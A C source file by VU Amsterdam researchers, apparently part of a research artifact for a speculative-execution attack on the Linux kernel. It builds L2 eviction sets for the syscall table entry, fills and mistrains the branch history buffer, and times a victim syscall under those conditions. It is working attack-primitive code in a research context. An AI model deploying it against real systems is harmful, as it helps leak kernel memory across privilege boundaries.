/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <time.h>
#include <assert.h>
#include <malloc.h>
#include <string.h>
#include <math.h>
#include "../common.h"
#include "evict_sys_table_l2.h"

#define SYSCALL_TRAIN  9    // mmap
#define SYSCALL_TEST  438	// pidfd_getfd
#define MAX_HISTORY_SIZE 512

#define PAGE_SIZE      (1 << 12)
#define HUGE_PAGE_SIZE (1 << 21)

extern uint64_t fill_bhb_call(uint8_t *history, void * target_function,
                     int arg1, void * arg2, void * arg3);


void * ev_set_l2[L2_WAYS];


uint64_t measure_syscall(uint64_t syscall_nr)
{
    uint64_t t0 = rdtscp();
    asm volatile("syscall\n"
                :
                : "a" (syscall_nr));
    return rdtscp()-t0;
}

#define TEST_ITERATIONS 10000

void time_and_print(uint8_t * history, char * desc, int syscall_nr,
        void ** ev_set_l2, uint8_t do_train) {

    float avg;
    int   min, max, hits;
    uint64_t t;

    avg = 0;
    min = 9999999;
    max = 0;

    fill_bhb_call(history, measure_syscall, syscall_nr, 0 , 0);

    for(int i=0; i<TEST_ITERATIONS; i++) {


        if (do_train){
            fill_bhb_call(history, measure_syscall, SYSCALL_TRAIN, 0 , 0);
            fill_bhb_call(history, measure_syscall, SYSCALL_TRAIN, 0 , 0);
        }

        sched_yield();

        if (ev_set_l2){
            evict(ev_set_l2);
        }

        t = fill_bhb_call(history, measure_syscall, syscall_nr, 0 , 0);
        avg += t;
        if(t < min) min = t;
        if(t > max) max = t;
    }
    avg = avg / TEST_ITERATIONS;

    printf("   - %-35s avg: %6.2f  min: %4d  max: %6d\n", desc, avg, min, max);
}


void link_ev_set(void ** ev_set, int ev_set_size) {

    void **next;
	for (int i = 0; i < ev_set_size; i++) {
		next = ev_set[i];
		*next = ev_set[(i + 1  ) % ev_set_size];
	}

}

void build_ev_set_l2(uint64_t target, void ** ev_set) {
    uint8_t * page_2mb[8];

    int n_pages = ceil((double) L2_SETS * L2_WAYS / (1LU << 15));

    for (int i = 0; i < n_pages; i++)
    {
        page_2mb[i] = allocate_huge_page();
    }


    uint64_t offset = target & 0x1fffff;

    int max_per_page = (1 << 15) / (L2_SETS);
    int page_idx = -1;

    for (int i = 0; i < L2_WAYS; i++)
    {
        if (i % max_per_page == 0) {
            page_idx += 1;
        }

        uint8_t * addr = page_2mb[page_idx] + offset + (i%max_per_page * L2_SETS * 64);
        assert(addr < (page_2mb[page_idx] + (1 << 21)));
        ev_set[i] = addr;
        // printf("EVSET L2: %p > %p\n", addr, ev_set[i]);
    }

    link_ev_set(ev_set, L2_WAYS);

}

void find_ev_set_for_sys_call_table(uint64_t sys_call_table_off) {


    uint8_t * target = (uint8_t *) sys_call_table_off;
    uint8_t * target_cache = (uint8_t *) sys_call_table_off + (8 * SYSCALL_TEST);

    printf("Using syscall table offset: 0x%lx, cacheline: 0x%lx\n", (uint64_t) target, (uint64_t) target_cache);

    build_ev_set_l2((uint64_t) target_cache, ev_set_l2);


    // VALIDATE

    uint64_t timings[2];

    uint8_t  history[MAX_HISTORY_SIZE];
    for(int i=0; i<MAX_HISTORY_SIZE; i++) history[i] = rand()&1;

    printf("Victim Syscall timings:\n");
    time_and_print(history, "NORMAL", SYSCALL_TEST, NULL, 0);
    time_and_print(history, "MIS-TRAINED", SYSCALL_TEST, NULL, 1);
    time_and_print(history, "L2 DATA EVICTION", SYSCALL_TEST, ev_set_l2, 0);
    time_and_print(history, "MIS-TRAINED + L2 DATA EVICTION", SYSCALL_TEST, ev_set_l2, 1);

    printf("\n");

}
